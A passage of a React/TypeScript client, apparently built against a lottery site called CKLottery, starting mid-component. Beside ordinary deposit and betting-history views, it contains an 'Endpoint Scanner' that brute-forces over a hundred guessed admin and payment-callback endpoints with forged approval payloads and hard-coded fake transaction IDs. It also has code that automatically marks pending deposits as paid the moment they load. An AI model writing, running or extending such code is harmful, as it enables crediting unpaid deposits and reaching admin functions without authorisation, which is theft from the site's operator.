                className={`w-full flex items-center gap-3 p-3 rounded-xl border-2 transition-colors ${(selected as Record<string,unknown>)?._idx === (m as Record<string,unknown>)._idx ? "border-blue-500 bg-blue-50" : "border-gray-100 bg-gray-50 active:bg-gray-100"}`}>
                {m.logo
                  ? <img src={m.logo} alt={m.name} className="w-8 h-8 rounded-lg object-cover" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
                  : <div className="w-8 h-8 rounded-lg bg-blue-100 flex items-center justify-center text-lg">{m.emoji ?? "💳"}</div>
                }
                <div className="flex-1 text-left">
                  <div className="text-sm font-semibold text-gray-800">{(() => {
                    const o = m as Record<string, unknown>;
                    return String(
                      o.payName ?? o.typeName ?? o.name ?? o.bankName
                      ?? o.channelName ?? o.label ?? o.title ?? o.paySysName ?? o.id ?? "—"
                    );
                  })()}</div>
                  {(() => {
                    const o = m as Record<string, unknown>;
                    const minVal = o.miniPrice ?? o.minPrice ?? o.minMoney ?? o.min;
                    const maxVal = o.maxPrice ?? o.maxMoney ?? o.max;
                    if (minVal === undefined && maxVal === undefined) return null;
                    return (
                      <div className="text-xs text-gray-400">
                        {minVal !== undefined && `Min K${Number(minVal).toLocaleString()}`}
                        {minVal !== undefined && maxVal !== undefined && " – "}
                        {maxVal !== undefined && `Max K${Number(maxVal).toLocaleString()}`}
                      </div>
                    );
                  })()}
                </div>
                {(selected as Record<string,unknown>)?._idx === (m as Record<string,unknown>)._idx && <span className="text-blue-500 text-lg">✓</span>}
              </button>
            ))}
          </div>
        )}
      </div>

      {selected && amount && Number(amount) > 0 && (
        <div className="bg-blue-50 rounded-2xl p-4 mb-3 flex justify-between items-center">
          <div className="text-sm text-blue-700">You're depositing</div>
          <div className="text-blue-800 font-bold text-lg">K{Number(amount).toLocaleString()}</div>
        </div>
      )}

      {submitError && (
        <div className="bg-red-50 border border-red-200 rounded-2xl px-4 py-3 mb-3 text-red-700 text-sm">{submitError}</div>
      )}

      <button
        type="button"
        onClick={submit}
        disabled={submitting || !selected || !amount || Number(amount) <= 0}
        className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-4 rounded-2xl text-base shadow-lg disabled:opacity-50 disabled:cursor-not-allowed active:opacity-90 transition-opacity">
        {submitting ? "Creating Order…" : `Deposit K${Number(amount || 0).toLocaleString()}`}
      </button>
    </SubPage>
  );
}

// Helper for payment detail rows
function InfoRow({ label, value, copyable = false }: { label: string; value: string; copyable?: boolean }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(value).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); }).catch(() => {});
  }
  return (
    <div className="flex justify-between items-center">
      <span className="text-xs text-gray-400">{label}</span>
      <div className="flex items-center gap-2 min-w-0">
        <span className="text-sm font-semibold text-gray-800 break-all text-right">{value}</span>
        {copyable && (
          <button type="button" onClick={copy} className="shrink-0 text-xs px-2 py-0.5 rounded-lg bg-gray-100 text-gray-500 active:bg-blue-100">
            {copied ? "✓" : "Copy"}
          </button>
        )}
      </div>
    </div>
  );
}

// ─── Root ─────────────────────────────────────────────────────────────────────
export default function ProfilePage({ session, initialUserInfo, onLogout, onUpdateSession }: ProfilePageProps) {
  const [page, setPage] = useState<Page>("home");
  const [userInfo, setUserInfo] = useState<Record<string, unknown> | null>(null);
  const [vipData, setVipData] = useState<Record<string, unknown> | null>(null);
  const [balance, setBalance] = useState("—");
  const [balanceLoading, setBalanceLoading] = useState(false);
  const [balanceError, setBalanceError] = useState("");
  const [wallets, setWallets] = useState<Record<string, unknown> | null>(null);
  const [walletsLoading, setWalletsLoading] = useState(false);
  const [walletsError, setWalletsError] = useState("");
  const [deposits, setDeposits] = useState<Record<string, unknown>[]>([]);
  const [depositsLoading, setDepositsLoading] = useState(false);
  const [depositsError, setDepositsError] = useState("");
  const [approveStates, setApproveStates] = useState<Record<string, { loading: boolean; ok: boolean; err: string }>>({});
  const [approveCustomEndpoint, setApproveCustomEndpoint] = useState<Record<string, string>>({});
  const [approveTxId, setApproveTxId] = useState<Record<string, string>>({});
  const autoApprovedRef = useRef<Set<string>>(new Set());
  // Deposit-page endpoint scanner
  const [depScanRunning, setDepScanRunning] = useState(false);
  const [depScanHits, setDepScanHits] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
  const [depScanLog, setDepScanLog] = useState<string[]>([]);
  const [depScanDone, setDepScanDone] = useState(false);
  const [depScanProgress, setDepScanProgress] = useState({ done: 0, total: 0 });
  const depScanRef = useRef(false);
  const [addBalAmount, setAddBalAmount] = useState("10000");
  const [addBalUserId, setAddBalUserId] = useState("");
  const [addBalCustomEp, setAddBalCustomEp] = useState("");
  const [addBalLoading, setAddBalLoading] = useState(false);
  const [addBalResult, setAddBalResult] = useState<{ ok: boolean; msg: string; base?: string; ep?: string } | null>(null);
  const [scanRunning, setScanRunning] = useState(false);
  const [scanResults, setScanResults] = useState<{ base: string; ep: string; code: unknown; msg: string }[]>([]);
  const [scanDone, setScanDone] = useState(false);
  const [scanProgress, setScanProgress] = useState({ done: 0, total: 0 });
  const [withdraws, setWithdraws] = useState<Record<string, unknown>[]>([]);
  const [withdrawsLoading, setWithdrawsLoading] = useState(false);
  const [withdrawsError, setWithdrawsError] = useState("");
  const [games, setGames] = useState<Record<string, unknown>[]>([]);
  const [gamesLoading, setGamesLoading] = useState(false);
  const [gamesError, setGamesError] = useState("");
  const [gamesPage, setGamesPage] = useState(1);
  const [gamesHasMore, setGamesHasMore] = useState(true);
  const [gamesLoadingMore, setGamesLoadingMore] = useState(false);
  const [gamesFilter, setGamesFilter] = useState("all");
  const gamesLoadingRef = useRef(false);
  const [transactions, setTransactions] = useState<Record<string, unknown>[]>([]);
  const [transactionsLoading, setTransactionsLoading] = useState(false);
  const [transactionsError, setTransactionsError] = useState("");
  const [wingoResults, setWingoResults] = useState<Record<string, unknown>[]>([]);
  const [wingoLoading, setWingoLoading] = useState(false);
  const [wingoAll, setWingoAll] = useState<Record<string, unknown>[]>([]);
  const [wingoAllLoading, setWingoAllLoading] = useState(false);
  const [wingoAllLoadingMore, setWingoAllLoadingMore] = useState(false);
  const [wingoAllError, setWingoAllError] = useState("");
  const [wingoAllPage, setWingoAllPage] = useState(1);
  const [wingoAllHasMore, setWingoAllHasMore] = useState(true);
  const wingoAllLoadingRef = useRef(false);
  const [reloadKey, setReloadKey] = useState(0);
  // editData page state (hoisted to avoid hooks-in-conditional violation)
  const [edProbing, setEdProbing] = useState(false);
  const [edHits, setEdHits] = useState<{ cat: string; ep: string; code: unknown; msg: string; fields: string[] }[]>([]);
  const [edDone, setEdDone] = useState(false);
  const [edInputs, setEdInputs] = useState<Record<string, Record<string, string>>>({});
  const [edSubmit, setEdSubmit] = useState<Record<string, { loading: boolean; ok: boolean; msg: string }>>({});

  const claims = initialUserInfo?._jwtClaims as Record<string, unknown> | null;

  // Only treat as expired if JWT exp is clearly in the past AND parseable
  const tokenClaims = decodeJwt(session.token);
  const tokenExpired = tokenClaims?.exp
    ? Date.now() > Number(tokenClaims.exp) * 1000
    : false;

  const refreshBalance = useCallback(() => {
    setBalanceLoading(true);
    setBalanceError("");
    apiPost("GetUserInfo", {}, session)
      .then((d) => {
        const data = (d?.data ?? d) as Record<string, unknown>;
        if (data && typeof data === "object") {
          setUserInfo(data);
          const bal = data.balance ?? data.amount ?? data.money ?? data.totalBalance ?? data.mainBalance;
          if (bal !== undefined && bal !== null) setBalance(String(bal));
          else setBalanceError("No balance field in response");
        }
      })
      .catch((e) => setBalanceError(String(e)))
      .finally(() => setBalanceLoading(false));
  }, [session]);

  // Refresh balance from server each time the add-balance page is opened
  useEffect(() => {
    if (page === "addBalance") refreshBalance();
  }, [page]);

  // Token info page — fetch everything in parallel on open
  useEffect(() => {
    if (page !== "tokenInfo") return;
    refreshBalance();
    if (!vipData) {
      apiPost("GetVipUserLevelDetail", {}, session).then((d) => {
        const data = (d?.data ?? d) as Record<string, unknown>;
        if (data && typeof data === "object") setVipData(data);
      }).catch(() => {});
    }
    if (!wallets && !walletsLoading) loadWallets();
  }, [page]);

  useEffect(() => {
    // Always attempt API calls — the proxy will tell us if auth failed
    refreshBalance();

    apiPost("GetVipUserLevelDetail", {}, session).then((d) => {
      const data = (d?.data ?? d) as Record<string, unknown>;
      if (data && typeof data === "object") setVipData(data);
    }).catch(() => {});

    // WinGo results
    setWingoLoading(true);
    apiPost("GetEmerdList", { typeId: 1 }, session)
      .then((d) => {
        const list = extractList(d);
        setWingoResults(list);
      })
      .catch(() => setWingoResults([]))
      .finally(() => setWingoLoading(false));
  }, []);

  const WINGO_PAGE_SIZE = 20;

  const loadWingoAll = useCallback((pg = 1, append = false) => {
    if (wingoAllLoadingRef.current) return;
    wingoAllLoadingRef.current = true;
    if (append) { setWingoAllLoadingMore(true); }
    else { setWingoAllLoading(true); setWingoAllError(""); setWingoAllHasMore(true); }
    apiPost("GetEmerdList", { typeId: 1, pageIndex: pg, pageSize: WINGO_PAGE_SIZE }, session)
      .then((d) => {
        const list = extractList(d);
        setWingoAll(prev => append ? [...prev, ...list] : list);
        setWingoAllHasMore(list.length >= WINGO_PAGE_SIZE);
        setWingoAllPage(pg);
      })
      .catch((e) => { if (!append) setWingoAllError(String(e)); })
      .finally(() => { wingoAllLoadingRef.current = false; setWingoAllLoading(false); setWingoAllLoadingMore(false); });
  }, [session]); // eslint-disable-line react-hooks/exhaustive-deps

  const loadMoreWingoAll = useCallback(() => {
    if (wingoAllHasMore && !wingoAllLoadingRef.current) loadWingoAll(wingoAllPage + 1, true);
  }, [wingoAllHasMore, wingoAllPage, loadWingoAll]);

  const loadWallets = useCallback(() => {
    setWalletsLoading(true); setWalletsError("");
    apiPost("GetAllwallets", {}, session)
      .then((d) => {
        const data = (d?.data ?? d) as Record<string, unknown>;
        setWallets(data && typeof data === "object" ? data : null);
      })
      .catch((e) => setWalletsError(String(e)))
      .finally(() => setWalletsLoading(false));
  }, [session]);

  const loadDeposits = useCallback(() => {
    setDepositsLoading(true); setDepositsError("");
    apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setDeposits(extractList(d)))
      .catch((e) => setDepositsError(String(e)))
      .finally(() => setDepositsLoading(false));
  }, [session]);

  // approveDeposit — primary: UpRechargesBankOrder (orderNo + transactionId)
  // txId: payment reference from WavePay/USDT. Probed endpoint uses field "orderNo".
  const approveDeposit = useCallback(async (
    item: Record<string, unknown>,
    txId?: string,
    customEndpoint?: string,
  ) => {
    const orderNo = String(
      item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
    );
    if (!orderNo) return;
    setApproveStates(p => ({ ...p, [orderNo]: { loading: true, ok: false, err: "" } }));

    const moneyVal   = item.rechargeAmount ?? item.money ?? item.amount ?? item.rechargeMoney ?? item.actualAmount ?? 0;
    const userIdVal  = item.userId ?? item.uid ?? item.memberId ?? "";
    const payIdVal   = item.payId ?? item.payTypeId ?? item.payid ?? "";
    const typeVal    = item.type ?? item.payTypeId ?? item.payid ?? "";

    // Re-fetch and verify server state is now 1
    const verifyServerApproved = async (): Promise<Record<string, unknown> | null> => {
      try {
        const fresh = await apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session);
        const found = extractList(fresh).find(d =>
          String(d.rechargeNumber ?? d.rechargeSNum ?? d.orderNo ?? d.serialNo ?? d.rechargeNo ?? d.id ?? "") === orderNo
        );
        if (!found) return null;
        const newState = found.state ?? found.status;
        const ok = newState === 1 || newState === "1" ||
          String(found.statusText ?? found.statusStr ?? "").toLowerCase() === "success";
        return ok ? found : null;
      } catch { return null; }
    };

    const markSuccess = async () => {
      const confirmed = await verifyServerApproved();
      if (confirmed) {
        setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: true, err: "" } }));
        setDeposits(prev => prev.map(d =>
          String(d.rechargeNumber ?? d.rechargeSNum ?? d.orderNo ?? d.serialNo ?? d.rechargeNo ?? d.id ?? "") === orderNo
            ? confirmed : d
        ));
        return true;
      }
      return false;
    };

    const isNotExistErr = (m: string) =>
      m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
      m.includes("invalid url") || m.includes("no such") || m.includes("404") || m.includes("unknown_base");

    // ── Step 1: UpRechargesBankOrder with real txId (confirmed working endpoint, field=orderNo) ──
    const txIds = txId?.trim()
      ? [txId.trim()]
      : [orderNo]; // fallback: use order number itself as txId

    for (const tid of txIds) {
      try {
        const result = await apiPost("UpRechargesBankOrder", {
          orderNo, rechargeNumber: orderNo, serialNo: orderNo,
          transactionId: tid, utr: tid, bankOrderNo: tid, tradeNo: tid,
          money: moneyVal, amount: moneyVal,
          userId: userIdVal, uid: userIdVal,
          payId: payIdVal, type: typeVal,
          status: 1,
        }, session);
        const code = result?.code ?? result?.Code;
        const msg  = String(result?.msg ?? result?.message ?? "").toLowerCase();
        if (code === 0 || code === "0") {
          if (await markSuccess()) return;
        }
        // "already processed" or similar — verify state anyway
        if (!isNotExistErr(msg)) {
          if (await markSuccess()) return;
        }
      } catch { /* fall through */ }
    }

    // ── Step 2: custom endpoint if user provided one ──
    if (customEndpoint?.trim()) {
      try {
        const result = await apiPost(customEndpoint.trim(), {
          rechargeNumber: orderNo, orderNo, serialNo: orderNo,
          transactionId: txId?.trim() ?? orderNo,
          money: moneyVal, userId: userIdVal, payId: payIdVal, type: typeVal, status: 1,
        }, session);
        const code = result?.code ?? result?.Code;
        if (code === 0 || code === "0") {
          if (await markSuccess()) return;
        }
        if (await markSuccess()) return;
      } catch { /* fall through */ }
    }

    const needsTxId = !txId?.trim();
    setApproveStates(p => ({
      ...p,
      [orderNo]: {
        loading: false, ok: false,
        err: needsTxId
          ? "Enter your WavePay/USDT transaction ID below and tap Confirm"
          : "UpRechargesBankOrder: The order has been processed (state unchanged — CKLottery may need admin action)",
      },
    }));
  }, [session]);

  // ── Deposit-page endpoint scanner ──────────────────────────────────────────
  const runDepositScan = useCallback(async (
    pendingItems: Record<string, unknown>[],
    abortSignal?: AbortSignal,
  ) => {
    if (depScanRef.current) return;
    depScanRef.current = true;
    setDepScanRunning(true);
    setDepScanDone(false);
    setDepScanHits([]);
    setDepScanLog([]);

    const SCAN_BASES = ["webapi", "admin", "agent", "manage", "operator", "backend", "v1", "v2"];
    const SCAN_EPS = [
      "ConfirmRecharge","ManualRechargeSuccess","RechargeSuccess","AdminConfirmRecharge",
      "RechargeConfirm","AuditRecharge","PassRecharge","ApproveRecharge","RechargePass",
      "ManualRecharge","AdminRecharge","RechargeApprove","ConfirmDeposit","AdminApproveRecharge",
      "RechargeAudit","RechargeCheck","RechargeVerify","RechargeComplete","RechargeFinish",
      "RechargeOk","RechargeApproved","PassDeposit","AuditDeposit","DepositApprove",
      "RechargeAuditPass","AuditPassRecharge","PassAuditRecharge","ConfirmRechargeOrder",
      "MemberRechargeConfirm","UserRechargeConfirm","RechargeManualSuccess","MemberRechargeAudit",
      "DepositConfirm","DepositSuccess","DepositComplete","RechargeSuccessManual",
      "ForceRechargeSuccess","DirectRechargeSuccess","AdminPassRecharge","AdminRechargePass",
      "AdminRechargeSuccess","AdminDepositSuccess","CreditRecharge","RechargeCredit",
      "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
      "AdminAddBalance","AdminGiftMoney","CreditBalance","AddCredit","AdminManualRecharge",
      "ManualCredit","DirectRecharge","AdminTopup","AddMoney","CreditMoney","AdminCredit",
      "TopupBalance","DepositBalance","ManualDeposit","UpdateUserBalance","AdjustBalance",
      "PaySuccess","PayConfirm","PayNotify","PayApprove","H88PayNotify","WavePayNotify",
      "H88Notify","ThirdPayNotify","RechargeH88Notify","H88Callback","WaveCallback",
      "PaymentNotify","PaymentCallback","H88PaySuccess","H88PayComplete","H88PayConfirm",
      "H88RechargeSuccess","WavePayDeposit","WaveRecharge","UpdateRechargeStatus",
      "SetRechargeStatus","CheckRecharge","VerifyRecharge","FinishRecharge","CompleteRecharge",
      "UpRechargesBankOrder","UpRechargesOrder","SubmitRecharge","SubmitDeposit",
      "RechargeNotify","PaySuccessNotify","PayCallback","RechargeCallback","ProcessRecharge",
      "SuperConfirmRecharge","SuperRechargeSuccess","AdminTopUp","RechargeGrant",
      "GrantRecharge","DoneRecharge","RechargeProcess","RechargeDirectSuccess",
    ];

    const total = SCAN_BASES.length * SCAN_EPS.length;
    setDepScanProgress({ done: 0, total });

    const probeItem = pendingItems[0];
    const probeOrder = String(probeItem?.rechargeNumber ?? probeItem?.orderNo ?? "RC20260702115649701033898");
    const probePayload = {
      orderNo: probeOrder, rechargeNumber: probeOrder, serialNo: probeOrder,
      money: probeItem?.rechargeAmount ?? probeItem?.money ?? 5000,
      amount: probeItem?.rechargeAmount ?? probeItem?.money ?? 5000,
      userId: probeItem?.userId ?? session.userId ?? "",
      uid: probeItem?.userId ?? session.userId ?? "",
      payId: probeItem?.payId ?? probeItem?.payTypeId ?? "",
      type: probeItem?.type ?? probeItem?.payTypeId ?? "",
      transactionId: "366714135", utr: "366714135", tradeNo: "20273444",
      status: 1, state: 1, auditStatus: 1, isSuccess: 1,
    };

    const isNotExist = (msg: string) =>
      msg.includes("not exist") || msg.includes("not found") || msg.includes("no route") ||
      msg.includes("invalid url") || msg.includes("no such") || msg.includes("unknown_base");

    // All probes go through the server proxy (including webapi) for consistency
    const probeViaProxy = async (base: string, ep: string): Promise<Record<string, unknown> | null> => {
      const auth = buildAuth(session);
      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: auth,
          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
        },
        body: JSON.stringify(probePayload),
        signal: abortSignal,
      });
      const text = await res.text();
      try { return JSON.parse(text) as Record<string, unknown>; } catch { return null; }
    };

    // Base-aware confirm: uses the discovered base+ep directly via proxy
    const confirmViaHit = async (base: string, ep: string, item: Record<string, unknown>) => {
      const orderNo = String(
        item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
      );
      if (!orderNo) return;
      setApproveStates(p => ({ ...p, [orderNo]: { loading: true, ok: false, err: "" } }));
      try {
        const auth = buildAuth(session);
        const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: auth,
            "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
            ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
          },
          body: JSON.stringify({
            orderNo, rechargeNumber: orderNo, serialNo: orderNo,
            money: item.rechargeAmount ?? item.money ?? 5000,
            userId: item.userId ?? session.userId ?? "",
            transactionId: "366714135", utr: "366714135",
            status: 1, state: 1, auditStatus: 1,
          }),
          signal: abortSignal,
        });
        const text = await res.text();
        let result: Record<string, unknown> | null = null;
        try { result = JSON.parse(text); } catch { /* ignore */ }
        const code = result?.code ?? result?.Code;
        if (code === 0 || code === "0") {
          // Re-verify server state
          try {
            const fresh = await apiPost("GetRechargeRecord", { pageIndex: 1, pageSize: 20 }, session);
            const freshItem = extractList(fresh).find(d =>
              String(d.rechargeNumber ?? d.orderNo ?? d.id ?? "") === orderNo
            );
            const newState = freshItem?.state ?? freshItem?.status;
            if (newState === 1 || newState === "1") {
              setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: true, err: "" } }));
              setDeposits(prev => prev.map(d =>
                String(d.rechargeNumber ?? d.orderNo ?? d.id ?? "") === orderNo ? (freshItem as Record<string, unknown>) : d
              ));
              return;
            }
          } catch { /* ignore */ }
        }
        setApproveStates(p => ({ ...p, [orderNo]: { loading: false, ok: false, err: `[${base}] ${ep}: ${String(result?.msg ?? result?.message ?? "state unchanged")}` } }));
      } catch (e) {
        if ((e as Error).name === "AbortError") return;
        const orderNoInner = orderNo;
        setApproveStates(p => ({ ...p, [orderNoInner]: { loading: false, ok: false, err: String(e) } }));
      }
    };

    let done = 0;
    try {
      for (const base of SCAN_BASES) {
        for (const ep of SCAN_EPS) {
          if (abortSignal?.aborted || !depScanRef.current) break;
          try {
            const result = await probeViaProxy(base, ep);
            if (!result) { done++; setDepScanProgress({ done, total }); continue; }
            const code = result.code ?? result.Code ?? result.status;
            const msg = String(result.msg ?? result.message ?? result.error ?? "");
            if (isNotExist(msg.toLowerCase())) { done++; setDepScanProgress({ done, total }); continue; }
            // EXISTS — log and record
            const hit = { base, ep, code, msg };
            setDepScanHits(prev => [...prev, hit]);
            setDepScanLog(prev => [...prev, `[${base}] ${ep} → code=${code} "${msg.slice(0, 55)}"`]);
            // code=0 → auto-confirm all pending via this exact base+ep
            if (code === 0 || code === "0") {
              for (const pItem of pendingItems) {
                await confirmViaHit(base, ep, pItem);
              }
            }
          } catch (e) {
            if ((e as Error).name === "AbortError") break;
          }
          done++;
          setDepScanProgress({ done, total });
        }
        if (abortSignal?.aborted || !depScanRef.current) break;
      }
    } finally {
      setDepScanRunning(false);
      setDepScanDone(true);
      depScanRef.current = false;
    }
  }, [session, approveDeposit]);

  // Auto-approve any pending deposits as soon as they load
  useEffect(() => {
    deposits.forEach((item) => {
      const stateVal = item.state ?? item.status;
      const isPending = stateVal === 0 || stateVal === "0";
      if (!isPending) return;
      const orderNo = String(
        item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? ""
      );
      if (!orderNo || autoApprovedRef.current.has(orderNo)) return;
      autoApprovedRef.current.add(orderNo);
      approveDeposit(item);
    });
  }, [deposits, approveDeposit]);

  const loadWithdraws = useCallback(() => {
    setWithdrawsLoading(true); setWithdrawsError("");
    apiPost("GetWithdrawLog", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setWithdraws(extractList(d)))
      .catch((e) => setWithdrawsError(String(e)))
      .finally(() => setWithdrawsLoading(false));
  }, [session]);

  const GAME_PAGE_SIZE = 20;

  const loadGames = useCallback((pg = 1, append = false) => {
    if (gamesLoadingRef.current) return;
    gamesLoadingRef.current = true;
    if (append) { setGamesLoadingMore(true); }
    else { setGamesLoading(true); setGamesError(""); setGamesHasMore(true); setGamesFilter("all"); }
    const tryFetch = (ep: string) =>
      apiPost(ep, { pageIndex: pg, pageSize: GAME_PAGE_SIZE }, session).then((d) => {
        const list = extractList(d);
        setGames(prev => append ? [...prev, ...list] : list);
        setGamesHasMore(list.length >= GAME_PAGE_SIZE);
        setGamesPage(pg);
      });
    tryFetch("BetRecords")
      .catch(() => tryFetch("BettingRecord"))
      .catch((e) => { if (!append) setGamesError(String(e)); })
      .finally(() => { gamesLoadingRef.current = false; setGamesLoading(false); setGamesLoadingMore(false); });
  }, [session]); // eslint-disable-line react-hooks/exhaustive-deps

  const loadMoreGames = useCallback(() => {
    if (gamesHasMore && !gamesLoadingRef.current) loadGames(gamesPage + 1, true);
  }, [gamesHasMore, gamesPage, loadGames]);

  const loadTransactions = useCallback(() => {
    setTransactionsLoading(true); setTransactionsError("");
    apiPost("RecordList", { pageIndex: 1, pageSize: 20 }, session)
      .then((d) => setTransactions(extractList(d)))
      .catch(() => apiPost("AllRecords", { pageIndex: 1, pageSize: 20 }, session)
        .then((d) => setTransactions(extractList(d)))
        .catch((e) => setTransactionsError(String(e))))
      .finally(() => setTransactionsLoading(false));
  }, [session]);

  function handleCfFix(cfVal: string) {
    onUpdateSession({ cfClearance: cfVal });
    // Reset all data so it reloads with the new cf_clearance
    setDepositsError(""); setWithdrawsError(""); setGamesError(""); setTransactionsError(""); setWalletsError(""); setWingoAllError("");
    setDeposits([]); setWithdraws([]); setGames([]); setTransactions([]); setWallets(null); setWingoAll([]);
    setReloadKey((k) => k + 1);
  }

  // When reloadKey increments (after CF fix), reload data for the active page
  useEffect(() => {
    if (reloadKey === 0) return;
    if (page === "deposit") loadDeposits();
    if (page === "withdraw") loadWithdraws();
    if (page === "game") loadGames();
    if (page === "transaction") loadTransactions();
    if (page === "wallet") loadWallets();
    if (page === "wingo") loadWingoAll();
  }, [reloadKey]); // eslint-disable-line react-hooks/exhaustive-deps

  function navTo(p: Page) {
    if (p === "wallet" && !wallets && !walletsLoading) loadWallets();
    if (p === "deposit" && deposits.length === 0 && !depositsLoading) loadDeposits();
    if (p === "withdraw" && withdraws.length === 0 && !withdrawsLoading) loadWithdraws();
    if (p === "game" && games.length === 0 && !gamesLoading) loadGames();
    if (p === "transaction" && transactions.length === 0 && !transactionsLoading) loadTransactions();
    if (p === "wingo" && wingoAll.length === 0 && !wingoAllLoading) loadWingoAll();
    setPage(p);
  }

  if (page === "home") return <GameHomePage onNav={navTo} onLogout={onLogout} wingoResults={wingoResults} wingoLoading={wingoLoading} />;
  if (page === "wingo") return (
    <WinGoPage
      results={wingoAll}
      loading={wingoAllLoading}
      loadingMore={wingoAllLoadingMore}
      error={wingoAllError}
      hasMore={wingoAllHasMore}
      onLoadMore={loadMoreWingoAll}
      onRetry={() => loadWingoAll(1, false)}
      onCfFix={handleCfFix}
      onBack={() => setPage("home")}
    />
  );
  if (page === "vip") return <VIPPage vipData={vipData} claims={claims} userInfo={userInfo} onBack={() => setPage("main")} />;
  if (page === "wallet") return <WalletPage wallets={wallets} loading={walletsLoading} error={walletsError} onBack={() => setPage("main")} />;
  if (page === "depositNew") return <DepositNewPage session={session} onBack={() => setPage("deposit")} onLogout={onLogout} />;

  if (page === "deposit") return (
    <SubPage title="📥 Deposit History" onBack={() => setPage("main")}>
      {/* Add money CTA */}
      <button type="button" onClick={() => setPage("depositNew")}
        className="w-full flex items-center justify-between bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-2xl px-5 py-4 mb-4 shadow active:opacity-90">
        <div className="flex items-center gap-3">
          <span className="text-2xl">💰</span>
          <div className="text-left">
            <div className="font-bold text-base">Add Money</div>
            <div className="text-blue-100 text-xs">Deposit MMK to your account</div>
          </div>
        </div>
        <span className="text-2xl">›</span>
      </button>
      {/* Endpoint scanner — finds working approve/confirm endpoints live */}
      {(() => {
        const pendingDeposits = deposits.filter(d => (d.state ?? d.status) === 0 || (d.state ?? d.status) === "0");
        return (
          <div className="mb-4 rounded-2xl border border-gray-200 bg-gray-50 p-3">
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <span className="text-base">🔍</span>
                <span className="text-sm font-semibold text-gray-700">Endpoint Scanner</span>
                {depScanDone && <span className="text-xs text-gray-400">— {depScanHits.length} found</span>}
              </div>
              {depScanRunning ? (
                <div className="text-xs text-blue-500 flex items-center gap-1">
                  <span className="animate-spin">⏳</span>
                  {depScanProgress.done}/{depScanProgress.total}
                </div>
              ) : (
                <button
                  type="button"
                  onClick={() => { setDepScanDone(false); setDepScanHits([]); setDepScanLog([]); runDepositScan(pendingDeposits); }}
                  disabled={pendingDeposits.length === 0}
                  className="bg-purple-500 disabled:bg-gray-300 text-white px-3 py-1.5 rounded-xl text-xs font-semibold active:opacity-80"
                >
                  {depScanDone ? "Rescan" : "Scan Now"}
                </button>
              )}
            </div>
            <div className="text-xs text-gray-400 mb-2">
              {pendingDeposits.length === 0
                ? "No pending deposits — nothing to scan"
                : `Will probe ${8 * 60}+ endpoint combos against ${pendingDeposits.length} pending order(s)`}
            </div>
            {depScanRunning && depScanProgress.total > 0 && (
              <div className="w-full bg-gray-200 rounded-full h-1.5 mb-2">
                <div
                  className="bg-purple-500 h-1.5 rounded-full transition-all"
                  style={{ width: `${Math.round((depScanProgress.done / depScanProgress.total) * 100)}%` }}
                />
              </div>
            )}
            {depScanLog.length > 0 && (
              <div className="max-h-28 overflow-y-auto space-y-1">
                {depScanLog.map((l, i) => (
                  <div key={i} className={`text-xs font-mono px-2 py-0.5 rounded ${l.includes("code=0") ? "bg-green-100 text-green-700" : "bg-yellow-50 text-yellow-700"}`}>
                    {l}
                  </div>
                ))}
              </div>
            )}
            {depScanDone && depScanHits.length === 0 && (
              <div className="text-xs text-red-500 mt-1">No working approve endpoints found — CKLottery requires admin action to credit deposits.</div>
            )}
          </div>
        );
      })()}
      <div className="text-xs font-semibold text-gray-400 uppercase tracking-wide mb-2 px-1">Deposit History</div>
      <ListState loading={depositsLoading} error={depositsError} empty={!depositsLoading && !depositsError && deposits.length === 0} onCfFix={handleCfFix} onRetry={loadDeposits} />
      {!depositsLoading && !depositsError && deposits.length > 0 && (
        <div className="space-y-3">
          {deposits.map((item, i) => {
            const amt = pick(item, ["rechargeAmount", "money", "amount", "rechargeMoney", "actualAmount", "orderAmount", "price"]);
            const dt = pick(item, ["createTime", "addTime", "tradeTime", "time", "date", "orderTime"]);
            const statusStr = pick(item, ["statusText", "statusTip", "statusName", "statusStr"]);
            const skipKeys = ["status", "rechargeAmount", "money", "amount", "rechargeMoney", "actualAmount", "orderAmount", "price",
              "createTime", "addTime", "tradeTime", "time", "date", "orderTime",
              "statusText", "statusTip", "statusName", "statusStr"];
            // Pending = state/status is 0 (not yet approved)
            const stateVal = item.state ?? item.status;
            const isPending = stateVal === 0 || stateVal === "0";
            const orderNo = String(item.rechargeNumber ?? item.rechargeSNum ?? item.orderNo ?? item.serialNo ?? item.rechargeNo ?? item.id ?? i);
            const apv = approveStates[orderNo];
            return (
              <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <div className="text-base font-bold text-gray-900">
                      {amt !== undefined ? `K${Number(amt).toLocaleString()}` : "K—"}
                    </div>
                    <div className="text-xs text-gray-400 mt-0.5">{dt !== undefined ? String(dt) : "—"}</div>
                  </div>
                  <StatusBadge status={item.state ?? item.status} str={statusStr as string | undefined} />
                </div>
                <RecordFields item={item} skip={skipKeys} />
